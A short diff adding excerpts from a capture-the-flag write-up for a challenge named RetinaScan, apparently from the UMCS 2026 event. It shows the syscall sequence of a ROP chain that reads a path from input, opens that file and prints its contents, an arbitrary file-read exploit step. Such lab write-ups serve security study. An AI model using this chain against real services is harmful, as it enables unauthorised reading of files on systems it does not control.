@@ -1,0 +1,10 @@
+# RetinaScan
+# Code and command excerpts from the UMCS UM 2026 write-up.
+
+## Fix the remote short read with a staged path (text)
+write(1, "ROP_OK!\n", 8)
+read(0, path_buf, 0x80)
+open(path_buf, O_RDONLY, 0)
+xchg edi, eax
+read(fd, out_buf, 0x200)
+write(1, out_buf, 0x200)
